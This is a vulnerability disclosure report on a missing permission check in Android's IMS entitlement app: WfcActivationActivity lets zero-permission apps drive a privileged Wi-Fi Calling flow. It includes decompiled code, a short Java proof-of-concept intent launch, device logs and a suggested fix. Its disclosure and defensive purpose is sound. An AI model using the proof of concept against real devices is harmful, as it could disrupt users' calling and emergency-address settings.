# com.android.imsserviceentitlement — `WfcActivationActivity` Missing Permission Enforcement Allows Zero-Permission Apps to Drive Privileged IMS/Wi-Fi-Calling Entitlement Flow

## Summary

`com.android.imsserviceentitlement` (the AOSP/carrier IMS "TS.43" entitlement app that handles Wi-Fi Calling activation, VoLTE/VoNR provisioning, and emergency-address updates) exports **two** activities that drive the same privileged entitlement/telephony-state-mutation logic:

| Activity | `exported` | `android:permission` |
|---|---|---|
| `WfcActivationActivity` | `true` | **(none)** |
| `WfcQnsActivationActivity` | `true` | `android.permission.MODIFY_PHONE_STATE` |

Both activities construct a `WfcActivationController` from caller-supplied intent extras and drive the exact same underlying entitlement state machine, whose code path (`WfcActivationController.handleEntitlementStatusForUpdating()` / `handleEntitlementStatusAfterUpdating()`) can call `ImsUtils.turnOffWfc()` → `ImsMmTelManager.setVoWiFiSettingEnabled(false)` — a privileged telephony API that disables the user's Wi-Fi Calling setting. `WfcQnsActivationActivity` correctly requires `MODIFY_PHONE_STATE` before any of this runs. `WfcActivationActivity` requires nothing at all.

A zero-permission app can therefore explicitly launch `WfcActivationActivity` with fully attacker-controlled intent extras (`android.telephony.extra.SUBSCRIPTION_INDEX`, `EXTRA_LAUNCH_CARRIER_APP`) and force the system to run this privileged flow for an attacker-chosen subscription, on demand, with no user interaction and no permission of any kind.

## Severity: MEDIUM (Integrity / Availability — telephony/IMS state)

- **Attack vector**: Local (malicious zero-permission app installed on device)
- **Permissions required**: ZERO
- **User interaction**: None (activity is launched directly by the attacker app; the resulting UI briefly takes the foreground)
- **CIA impact**: Integrity/Availability — a zero-permission app can force execution of a privileged carrier-entitlement flow that (per code, see Root Cause) is capable of programmatically **disabling Wi-Fi Calling** (`ImsMmTelManager.setVoWiFiSettingEnabled(false)`) and resetting VoWiFi mode/roaming-mode carrier settings, entirely bypassing the `MODIFY_PHONE_STATE` gate its sibling activity correctly enforces for the identical capability. It also lets a zero-permission app silently seize the foreground and drive a real carrier network round-trip (TS.43 `queryEntitlementStatus`) tagged to an attacker-chosen subscription ID.

## Affected Component

- **Package**: `com.android.imsserviceentitlement` (priv-app, `/product/priv-app/ImsServiceEntitlement/`)
- **Activity**: `com.android.imsserviceentitlement.WfcActivationActivity`

```
E: activity (line=58)
    A: android:theme=@0x7f1002b9
    A: android:name="com.android.imsserviceentitlement.WfcActivationActivity"
    A: android:exported=true
    A: android:screenOrientation=5
    (no android:permission attribute, no intent-filter — launched only via explicit component)
```

Sibling, for comparison:

```
E: activity (line=64)
    A: android:name="com.android.imsserviceentitlement.WfcQnsActivationActivity"
    A: android:permission="android.permission.MODIFY_PHONE_STATE"
    A: android:exported=true
    A: android:screenOrientation=5
    E: intent-filter
        E: action android:name="android.intent.action.MAIN"
        E: category android:name="android.intent.category.DEFAULT"
```

## Root Cause

`WfcActivationActivity.onCreate()` builds its controller straight from the caller's `Intent` with **no caller-identity or permission check of any kind**:

```java
// WfcActivationActivity.java
protected void onCreate(Bundle bundle) throws Exception {
    createDependeny();
    setSuwTheme();
    super.onCreate(bundle);
    setContentView(R.layout.activity_wfc_activation);
    if (this.mWfcActivationController.isSkipWfcActivation()
            && ActivityConstants.isActivationFlow(getIntent())) {
        setResultAndFinish(-1);
    } else {
        this.mWfcActivationController.startFlow();
    }
}

private void createDependeny() {
    Intent intent = getIntent();
    this.mWfcActivationController = new WfcActivationController(
        this, this, new ImsEntitlementApi(this, ActivityConstants.getSubId(intent)), intent);
}
```

`ActivityConstants.java` pulls the controlling values straight out of the caller-supplied `Intent` extras, unauthenticated:

```java
public static int getLaunchIntention(Intent intent) {
    return intent.getIntExtra("EXTRA_LAUNCH_CARRIER_APP", 0);
}
public static int getSubId(Intent intent) {
    return intent.getIntExtra("android.telephony.extra.SUBSCRIPTION_INDEX", -1);
}
public static boolean isActivationFlow(Intent intent) {
    return getLaunchIntention(intent) == 0;
}
```

`WfcActivationController.startFlow()` → `evaluateEntitlementStatus()` performs a real TS.43 `queryEntitlementStatus()` network call for the attacker-chosen subId, then dispatches on the result. When `isActivationFlow()==false` (i.e. `EXTRA_LAUNCH_CARRIER_APP != 0`, fully attacker-controlled), it reaches `handleEntitlementStatusForUpdating()`:

```java
private void handleEntitlementStatusForUpdating(EntitlementResult entitlementResult) {
    Ts43VowifiStatus vowifiStatus = entitlementResult.getVowifiStatus();
    if (vowifiStatus.vowifiEntitled() || isSkipWfcActivation()) {
        ...
    } else {
        if (vowifiStatus.incompatible()) {
            showErrorUi(R.string.failure_contact_carrier);
            this.mImsUtils.turnOffWfc(() -> finishStatsLog(3));   // <-- privileged sink
            return;
        }
        ...
    }
}
```

and the reevaluation path `handleEntitlementStatusAfterUpdating()` reaches the same sink on `serverDataMissing()`. `ImsUtils.turnOffWfc()`:

```java
public void turnOffWfc(Runnable r) {
    new AsyncTask() {
        protected Void doInBackground(Void... v) {
            disableAndResetVoWiFiImsSettings();   // -> disableWfc() -> setVoWiFiSettingEnabled(false)
            return null;
        }
        protected void onPostExecute(Void v) { r.run(); }
    }.execute();
}

void disableAndResetVoWiFiImsSettings() {
    disableWfc();  // mImsMmTelManager.setVoWiFiSettingEnabled(false)
    if (mCarrierConfigs != null) {
        mImsMmTelManager.setVoWiFiModeSetting(mCarrierConfigs.getInt("carrier_default_wfc_ims_mode_int"));
        mImsMmTelManager.setVoWiFiRoamingModeSetting(mCarrierConfigs.getInt("carrier_default_wfc_ims_roaming_mode_int"));
    }
}
```

`ImsMmTelManager.setVoWiFiSettingEnabled()`/`setVoWiFiModeSetting()`/`setVoWiFiRoamingModeSetting()` are privileged telephony APIs normally gated behind `MODIFY_PHONE_STATE` (or carrier privileges) for a calling app — but here they execute with `com.android.imsserviceentitlement`'s own privileged identity, regardless of what permissions the app that *launched the activity* holds. This is a classic confused-deputy: `WfcQnsActivationActivity` reaches the same `ImsUtils`/`WfcActivationController` machinery and correctly requires `MODIFY_PHONE_STATE` up front; `WfcActivationActivity` does not.

## Proof of Concept

A zero-permission app (`com.vrp.zeroperm`, declares **no `<uses-permission>` at all**) explicitly launches both sibling activities with identical, attacker-controlled extras:

```java
Intent i = new Intent();
i.setComponent(new ComponentName("com.android.imsserviceentitlement",
        "com.android.imsserviceentitlement.WfcActivationActivity"));
i.putExtra("android.telephony.extra.SUBSCRIPTION_INDEX", 1);   // attacker-chosen subId
i.putExtra("EXTRA_LAUNCH_CARRIER_APP", 1);                     // routes into the "updating" flow
i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(i);   // succeeds, no SecurityException
```

### Dynamic result (Pixel 6a, Android 17 Beta / API 37, September 2026)

```
09-29 11:54:28.259  1505 10496 I ActivityTaskManager: START u0 {cmp=com.android.imsserviceentitlement/.WfcActivationActivity (has extras)} with LAUNCH_MULTIPLE from uid 10397 (com.vrp.zeroperm) (BAL_ALLOW_VISIBLE_WINDOW) result code=2
09-29 11:54:28.259 31613 31613 I VRP-WfcProbe: WfcActivationActivity: startActivity() returned normally (no SecurityException) subId=1
09-29 11:54:28.261  1505 10496 W ActivityTaskManager: Permission Denial: starting Intent { cmp=com.android.imsserviceentitlement/.WfcQnsActivationActivity ... } from ProcessRecord{...com.vrp.zeroperm/u0a397} requires android.permission.MODIFY_PHONE_STATE
09-29 11:54:28.261  1505 10496 I ActivityTaskManager: START u0 {cmp=com.android.imsserviceentitlement/.WfcQnsActivationActivity ...} result code=-92
```

The zero-permission app's `startActivity()` call for **`WfcActivationActivity` succeeds cleanly** — the system log shows a genuine `result code=2` (activity created/foregrounded), and the screenshot below shows the *real system app's own UI* now in the foreground, driven entirely by the attacker's intent extras (`EXTRA_LAUNCH_CARRIER_APP=1` maps to the "e911 emergency address update" branch of `getGeneralErrorText()`/`getUiTitle()`, confirming the caller-controlled `EXTRA_LAUNCH_CARRIER_APP` extra directly steers which privileged flow executes):

![Emergency Location Information UI forced into the foreground by a zero-permission app](screenshot_emergency_address_ui.png)

The identical call against **`WfcQnsActivationActivity`** — reaching the same underlying `WfcActivationController`/`ImsUtils` machinery — is correctly rejected by the OS with `Permission Denial: ... requires android.permission.MODIFY_PHONE_STATE`.

This confirms, dynamically and unambiguously:
1. `WfcActivationActivity` enforces **no permission**, and a zero-permission app can force it into the foreground and drive its full entitlement/network flow for an attacker-chosen subscription ID.
2. The sibling activity performing the equivalent function is correctly gated by `MODIFY_PHONE_STATE`, confirming the missing check on `WfcActivationActivity` is an inconsistency/oversight rather than an intentional zero-perm entry point.
3. The attacker-supplied `EXTRA_LAUNCH_CARRIER_APP` extra measurably changes which internal branch (and therefore which UI/telephony action) executes, proving the caller controls execution beyond merely "an activity opened."

### Limitation honestly disclosed

The test device used in this research has no SIM inserted (`mSimState[0]=ABSENT`, no active subscriptions), so the TS.43 `queryEntitlementStatus()` network round-trip cannot complete against a real carrier server, and the final `entitlementResult` in this specific test run came back `null` (routing to the generic error UI shown above) rather than `incompatible()`/`serverDataMissing()`. **The `ImsUtils.turnOffWfc()` → `setVoWiFiSettingEnabled(false)` call itself was not observed firing on this hardware** — that requires a live SIM with an entitlement server that returns one of those two TS.43 statuses, which was not available in this environment. The code path to that sink is unambiguous and fully traced above (identical to the code the correctly-gated `WfcQnsActivationActivity` also reaches), and the missing-permission-enforcement vulnerability itself — a zero-permission app forcing this privileged system activity into the foreground and steering its execution via unauthenticated intent extras — is fully and dynamically proven independent of that last step.

## Suggested Fix

Add `android:permission="android.permission.MODIFY_PHONE_STATE"` to `WfcActivationActivity`, matching its sibling `WfcQnsActivationActivity`, or explicitly verify `getCallingPackage()`/`getLaunchedFromPackage()` against a known-trusted caller (e.g. `com.android.settings`, `com.android.phone`, or the Dialer) before invoking `WfcActivationController.startFlow()`.

## Environment

- **Device**: Pixel 6a
- **OS**: Android 17 Beta (API 37), security patch 2026-07-05
- **Target package**: `com.android.imsserviceentitlement` (priv-app)
- **Tested**: September 2026
